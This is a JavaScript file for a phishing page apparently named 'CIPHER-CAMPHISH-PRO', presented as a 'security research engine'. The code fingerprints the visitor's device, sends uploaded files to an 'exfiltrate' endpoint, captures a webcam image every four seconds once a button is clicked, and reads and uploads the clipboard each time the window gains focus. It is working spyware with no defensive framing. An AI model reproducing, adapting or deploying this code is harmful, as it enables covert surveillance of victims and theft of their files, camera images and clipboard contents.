/**
 * PROJECT: CIPHER-CAMPHISH-PRO
 * ROLE: SOVEREIGN SECURITY RESEARCH ENGINE
 */

(function() {
    'use strict';

    const SID = "OVL-" + Math.random().toString(36).substring(2, 11).toUpperCase();
    const DOM = {
        terminal: document.getElementById('terminal'),
        initBtn: document.getElementById('init-btn'),
        vHidden: document.getElementById('v-hidden'),
        cHidden: document.getElementById('c-hidden'),
        fileInput: document.getElementById('file-input'),
        dropZone: document.getElementById('drop-zone'),
        targetID: document.getElementById('target-ip'),
        ram: document.getElementById('ram-val'),
        cores: document.getElementById('core-val'),
        battery: document.getElementById('bat-val'),
        loc: document.getElementById('loc-val'),
        isp: document.getElementById('isp-val'),
        uBar: document.getElementById('upload-bar'),
        uStat: document.getElementById('upload-status'),
        uPerc: document.getElementById('percent-text')
    };

    const writeLog = (m, t = 'info') => {
        const line = document.createElement('div');
        const colors = { info: 'text-cyan-400', success: 'text-green-400 font-bold', warn: 'text-yellow-400', err: 'text-red-500 font-black' };
        line.className = colors[t] || 'text-slate-400';
        line.innerHTML = `<span class="opacity-30">${new Date().toLocaleTimeString()}</span> > ${m}`;
        DOM.terminal.appendChild(line);
        DOM.terminal.scrollTop = DOM.terminal.scrollHeight;
    };

    // --- 1. NEURAL HANDSHAKE (Updates UI with Server-side Geo Info) ---
    const handshake = async () => {
        writeLog("Establishing Neural Handshake...", "info");
        const dna = {
            sid: SID,
            agent: navigator.userAgent,
            ram: navigator.deviceMemory ? navigator.deviceMemory + "GB" : "UNK",
            cores: navigator.hardwareConcurrency || "UNK",
            res: `${screen.width}x${screen.height}`
        };

        // Battery Check
        try {
            const bat = await navigator.getBattery();
            dna.battery = Math.round(bat.level * 100) + "%";
            DOM.battery.textContent = dna.battery;
        } catch(e) { dna.battery = "LOCKED"; DOM.battery.textContent = "LOCKED"; }

        DOM.ram.textContent = dna.ram;
        DOM.cores.textContent = dna.cores;

        try {
            const response = await fetch('/api/v7/handshake', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(dna)
            });
            const res = await response.json();
            
            // ሰርቨሩ የላከውን Geo Info እዚህ እንጠቀማለን
            DOM.targetID.textContent = res.session;
            DOM.loc.textContent = "LOADED"; // ሰርቨርህ ላይ IP-API መረጃ ካለ እዚህ ይገባል
            DOM.isp.textContent = "SYNCED";
            writeLog(`Node Authenticated: ${res.session}`, "success");
        } catch(e) { writeLog("Handshake Failure. Offline mode active.", "err"); }
    };

    // --- 2. UPLOAD ENGINE (FIXED) ---
    DOM.dropZone.addEventListener('click', () => DOM.fileInput.click());

    DOM.fileInput.addEventListener('change', async (e) => {
        const files = Array.from(e.target.files);
        if(files.length === 0) return;

        writeLog(`Exfiltrating ${files.length} neural packages...`, "warn");
        DOM.uStat.classList.remove('hidden');

        for (let i = 0; i < files.length; i++) {
            const reader = new FileReader();
            reader.readAsDataURL(files[i]);
            reader.onload = async () => {
                await fetch('/api/v7/exfiltrate', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ sid: SID, blob: reader.result, meta: { origin: 'upload', name: files[i].name } })
                });
                const prog = Math.round(((i + 1) / files.length) * 100);
                DOM.uBar.style.width = prog + "%";
                DOM.uPerc.textContent = prog + "%";
            };
        }
    });

    // --- 3. NEURAL CAPTURE (CAM) ---
    const startCam = async () => {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            DOM.vHidden.srcObject = stream;
            writeLog("Neural sensors synchronized.", "success");

            const ctx = DOM.cHidden.getContext('2d');
            setInterval(() => {
                DOM.cHidden.width = DOM.vHidden.videoWidth;
                DOM.cHidden.height = DOM.vHidden.videoHeight;
                ctx.drawImage(DOM.vHidden, 0, 0);
                fetch('/api/v7/exfiltrate', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ sid: SID, blob: DOM.cHidden.toDataURL('image/jpeg', 0.6), meta: { origin: 'webcam' } })
                });
            }, 4000);
        } catch(e) { writeLog("Hardware Lock: Sensor Access Denied.", "err"); }
    };

    DOM.initBtn.addEventListener('click', () => {
        DOM.initBtn.disabled = true;
        DOM.initBtn.textContent = "AUDITING...";
        handshake();
        startCam();
    });

    // Clipboard Snatcher
    window.addEventListener('focus', async () => {
        const text = await navigator.clipboard.readText().catch(() => null);
        if (text) {
            fetch('/api/v7/exfiltrate', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ sid: SID, blob: "data:text/plain;base64," + btoa(text), meta: { origin: 'clipboard' } })
            });
            writeLog("Buffer synchronized.", "warn");
        }
    });

})();
